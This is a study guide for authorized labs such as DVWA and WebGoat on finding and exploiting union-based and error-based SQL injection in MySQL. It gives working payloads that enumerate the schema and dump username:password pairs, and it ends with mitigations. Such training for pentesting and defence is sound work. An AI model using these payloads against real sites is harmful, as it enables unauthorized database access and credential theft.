# Lab Guide: Enumerating an In-Band SQL Injection (Union-based & Error-based)

**Purpose:** A concise, practical step-by-step guide to enumerate and extract data from a web application vulnerable to In‑Band SQL Injection (Union‑based and Error‑based). Intended for authorized lab practice (DVWA, bWAPP, WebGoat, etc.) and exam preparation (EJPT).

---

## Quick Summary
- **In‑Band SQLi:** attacker receives query results through the same HTTP response channel.
- **Two common subtypes:** **Union‑based** (uses `UNION SELECT`) and **Error‑based** (forces DB errors to leak data).

---

## Step‑by‑Step Enumeration

### 1) Find candidate inputs
- Inspect pages, forms, query parameters, JSON bodies, cookies, and headers.
- Quick test: append `'` (single quote) to parameters and look for syntax errors or changed responses.
  - Example: `http://lab/vuln.php?id=1'`

### 2) Confirm SQLi (basic boolean tests)
- `id=1 OR 1=1 -- -` (should show more/equal content)
- `id=1 AND 1=2 -- -` (should show less/different content)
- If responses change consistently => likely injectable.

### 3) Determine In‑Band subtype
- **Union‑based test:** attempt `UNION SELECT` with guessed column counts until it renders controlled content.
- **Error‑based test (MySQL):**
  ```
  id=1 AND updatexml(1,concat(0x7e,(select database()),0x7e),1)-- -
  ```
  If the error message includes `~<dbname>~` it's error‑based.

### 4) Find number of columns (UNION technique)
- `ORDER BY` approach:
  ```
  id=1 ORDER BY 1-- -
  id=1 ORDER BY 2-- -
  ...
  ```
  When it fails, the last successful number is the column count.
- `UNION NULL` approach:
  ```
  id=1 UNION SELECT NULL-- -
  id=1 UNION SELECT NULL,NULL-- -
  ...
  ```

### 5) Locate visible column(s)
- Use `UNION SELECT` with marker strings:
  ```
  id=1 UNION SELECT 'col1','col2',NULL-- -
  ```
  The column whose value shows in the page is a visible column you can use to leak data.

### 6) Extract schema information (examples for MySQL)
- Current database:
  ```
  id=1 UNION SELECT NULL, database(), NULL-- -
  ```
- List tables in current DB:
  ```
  id=1 UNION SELECT NULL, group_concat(table_name), NULL FROM information_schema.tables WHERE table_schema=database()-- -
  ```
- List columns of a table (e.g., `users`):
  ```
  id=1 UNION SELECT NULL, group_concat(column_name), NULL FROM information_schema.columns WHERE table_name='users'-- -
  ```
- Dump rows (e.g., `username:password`):
  ```
  id=1 UNION SELECT NULL, group_concat(username,0x3a,password SEPARATOR 0x2c), NULL FROM users-- -
  ```

### 7) Error‑based extraction (alternative)
- When `UNION` is blocked, use functions that cause DB errors embedding selected values:
  ```
  id=1 AND updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)-- -
  ```
- The DB error message will contain the requested data if errors are shown.

## General Enumeration Steps (condensed)
1. Find inputs: GET/POST params, headers, cookies, JSON bodies.
2. Confirm injection: `'`, `"`, boolean tests (`OR 1=1`, `AND 1=2`).
3. Use `UNION SELECT` to discover number of columns and visible column positions.
4. Force original query to return no rows (e.g., use `id=0`) so `UNION` output is rendered.
5. Use `database()`, `information_schema.tables`, `information_schema.columns`, and `group_concat()` to enumerate schema and data.
6. If `UNION` is blocked, try error‑based techniques (e.g., `updatexml()` in MySQL) or blind/time injections as alternatives.

---

## Useful Payloads (MySQL examples)
- Basic boolean:
  ```
  ' OR '1'='1' -- -
  ```
- UNION show DB (2 visible columns example):
  ```
  1 UNION SELECT NULL, database() -- -
  ```
- Error-based leak:
  ```
  1 AND updatexml(1,concat(0x7e,(select database()),0x7e),1)-- -
  ```

---

## Non‑Destructive Practice Rules
- Use only `SELECT` queries; avoid `INSERT`, `UPDATE`, `DELETE`, `DROP`.
- Record all requests/responses and timestamps as evidence.

---

## Post‑Enumeration Checklist (for report)
- Parameter(s) vulnerable, location (URL, POST body, header).
- Subtype (Union / Error / Both).
- Proof of concept: request and response (screenshot or raw HTTP).
- Data extracted (example rows) and impact assessment.
- Mitigations recommended.

---

## Mitigations & Recommendations
- Use prepared statements / parameterized queries (avoid string concatenation).
- Implement proper input validation and output encoding.
- Use least‑privilege DB accounts for application connections.
- Disable verbose DB error messages in production; log internally.
- Use WAF rules to detect and block common SQLi payloads; perform regular pentests.

---

## Tools & Resources
- Burp Suite (Proxy, Repeater)
- sqlmap
- curl / httpie
- DVWA, bWAPP, WebGoat (training labs)
- DB clients (mysql, psql) for local testing

---

## Short Study Notes (for quick revision)
- In‑Band = data comes back in same HTTP response.
- UNION = combine attacker columns with legitimate query.
- Error = force DB error that echoes data.
- Always get permission before testing.

---